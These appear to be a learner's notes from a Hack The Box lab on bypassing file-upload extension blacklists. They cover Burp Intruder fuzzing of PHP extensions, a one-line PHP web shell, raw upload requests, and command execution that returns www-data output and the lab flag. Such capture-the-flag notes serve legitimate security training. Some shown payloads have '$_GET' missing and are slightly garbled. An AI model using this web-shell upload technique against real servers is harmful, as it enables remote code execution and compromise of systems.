# Blacklist Filters

If the type validation controls on the back-end server were not securely coded, an attacker can utilize multiple techniques to bypass them and reach PHP file uploads.

## Blacklisting Extensions

If we got an error message like Extension not allowed

There are generally two common forms of validating a file extension on the back-end:

1. Testing against a blacklist of types
2. Testing against a whitelist of types

Blacklist is weakest than whitelist

Example of code :

$fileName = basename($_FILES["uploadFile"]["name"]);
$extension = pathinfo($fileName, PATHINFO_EXTENSION);
$blacklist = array('php', 'php7', 'phps');

if (in_array($extension, $blacklist)) {
    echo "File type not allowed";
    die();
}

Tip: The comparison above is also case-sensitive so we may try pHp extension

## Fuzzing Extensions

- Burp History
- Locate our last request to /upload.php
- Right-click and send to Intruder
- Select the .php extension in filename="HTB.php" and click the Add button to add it as a fuzzing position
- Load the PHP extensions list from above in the Payloads tab under Payload Options
- Un-tick the URL Encoding option
- Start Attack
- Sort the results by Length to identify success and failures

## Non-Blacklisted Extensions

--> Not all extensions will work with all web server configurations

- Let's use the .phtml extension
- Right-click on its request in the Intruder results and select Send to Repeater
- Changing the file name to use the .phtml extension
- Changing the content to that of a PHP web shell

http://SERVER_IP:PORT/profile_images/shell.phtml?cmd=id

## LAB

Content-Disposition: form-data; name="uploadFile"; filename="htb§.jpg§"

/opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt

.php2
.php3
.php4
.php6
.php7

echo "<?php system($_GET['cmd']); ?>" > shell.php2

Response Body
onchange="checkFile(this)"
onchange=""


------WebKitFormBoundaryo2e3LPSXPrfCDsAF
Content-Disposition: form-data; name="uploadFile"; filename="shell.php2"
Content-Type: application/octet-stream

<?php system(['cmd']); ?>

------WebKitFormBoundaryo2e3LPSXPrfCDsAF--

http://83.136.250.104:31697//profile_images/shell.php2?cmd=id
<?php system(['cmd']); ?>


echo "<?php system($_GET['cmd']); ?>" > shell.php6

------WebKitFormBoundaryUW9uqzvcLxoyxphj
Content-Disposition: form-data; name="uploadFile"; filename="shell.php6"
Content-Type: application/octet-stream

<?php system(['cmd']); ?>

------WebKitFormBoundaryUW9uqzvcLxoyxphj--

http://83.136.250.104:31697//profile_images/shell.php6?cmd=id
<?php system(['cmd']); ?>

echo "<?php system($_GET['cmd']); ?>" > shell.php4
echo "<?php system($_GET['cmd']); ?>" > shell.php3

http://83.136.250.104:31697//profile_images/shell.php?cmd=id
<?php system(['cmd']); ?>

echo "<?php system($_GET['cmd']); ?>" > shell.php7

------WebKitFormBoundaryyAgZW0h3I2HLOEM8
Content-Disposition: form-data; name="uploadFile"; filename="htb§.jpg§"
Content-Type: image/jpeg

<?php echo '<p>Hello World</p>'; ?>
------WebKitFormBoundaryyAgZW0h3I2HLOEM8--

GET //profile_images/htb§.php2§ HTTP/1.1
Host: 83.136.250.104:31697

git clone https://github.com/swisskyrepo/PayloadsAllTheThings/
vi PayloadsAllTheThings/Upload\ Insecure\ Files/Extension\ PHP/extensions.lst 

------WebKitFormBoundaryePc1eWTbsBbqTWjF
Content-Disposition: form-data; name="uploadFile"; filename="htb§.jpg§"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------WebKitFormBoundaryePc1eWTbsBbqTWjF--

http://83.136.250.104:31697//profile_images/htb.phar?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

http://83.136.250.104:31697//profile_images/htb.phar?cmd=cat%20/flag.txt
HTB{1_c4n_n3v3r_b3_bl4ckl1573d}